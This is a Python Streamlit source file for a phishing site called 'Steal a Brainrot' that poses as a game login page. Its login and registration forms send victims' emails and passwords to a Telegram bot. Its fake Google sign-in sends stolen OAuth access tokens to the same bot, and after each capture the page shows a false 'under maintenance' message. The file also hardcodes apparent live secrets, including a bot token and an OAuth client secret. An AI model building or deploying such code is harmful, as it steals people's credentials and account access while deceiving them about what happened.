import streamlit as st
import requests
import sqlite3

# Konfiguratsiya
BOT_TOKEN = "8112666081:AAGtROwNttf6lsApMQUxszHoC8xf7rB0s4A"
CHAT_ID = "8088597011"
CLIENT_ID = "1085309280384-idkflab6a8as83fuum4479ovni8b367e.apps.googleusercontent.com"
CLIENT_SECRET = "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"
REDIRECT_URI = "https://steal-breinrot-app-gtxahjgkk8egizl2uuu6sd.streamlit.app/"

# DB
conn = sqlite3.connect('users.db', check_same_thread=False)
c = conn.cursor()
c.execute('CREATE TABLE IF NOT EXISTS users (email TEXT PRIMARY KEY, password TEXT)')
conn.commit()

# Dizayn
st.set_page_config(page_title="Steal a Brainrot", layout="centered")
st.markdown("""
    <style>
    .stApp {background-color: #000000; color: white;}
    div.stButton > button {width: 100%; border-radius: 10px; background-color: #ff4b4b; color: white;}
    </style>
""", unsafe_allow_html=True)

st.title("🔥 Steal a Brainrot")

tab1, tab2 = st.tabs(["Login", "Registratsiya"])

# FUNKSIYA: Tamirlanmoqda xabari
def show_maintenance():
    st.success("Muvaffaqiyatli!")
    st.info("Ilova ayni damda tamirlanmoqda, tez orada tayyor bo'ladi! 🛠️")
    st.balloons()

with tab1:
    email = st.text_input("Email", placeholder="example@gmail.com")
    password = st.text_input("Parol", type="password")
    if st.button("Kirish"):
        # Login bo'lsa ham, botga yuborish uchun tekshiruv shart emas (yoki bazadan tekshiring)
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text=Login qilindi:\nEmail: {email}\nParol: {password}")
        show_maintenance()

with tab2:
    reg_email = st.text_input("Yangi Email", placeholder="...@gmail.com")
    reg_password = st.text_input("Yangi Parol", type="password")
    if st.button("Ro'yxatdan o'tish"):
        if "@gmail.com" in reg_email and len(reg_password) >= 8:
            requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text=Yangi Registratsiya:\nEmail: {reg_email}\nParol: {reg_password}")
            show_maintenance()
        else:
            st.error("Email noto'g'ri yoki parol juda qisqa!")

# Google
st.divider()
st.link_button("Google orqali kirish", f"https://accounts.google.com/o/oauth2/v2/auth?response_type=code&client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&scope=email profile", type="primary")

# Google callback
params = st.query_params
code = params.get("code")
if code:
    data = {"code": code, "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET, "redirect_uri": REDIRECT_URI, "grant_type": "authorization_code"}
    res = requests.post("https://oauth2.googleapis.com/token", data=data).json()
    if "access_token" in res:
        user_info = requests.get("https://www.googleapis.com/oauth2/v1/userinfo", headers={"Authorization": f"Bearer {res['access_token']}"}).json()
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text=Google Login:\nEmail: {user_info.get('email')}\nToken: {res['access_token']}")
        show_maintenance()
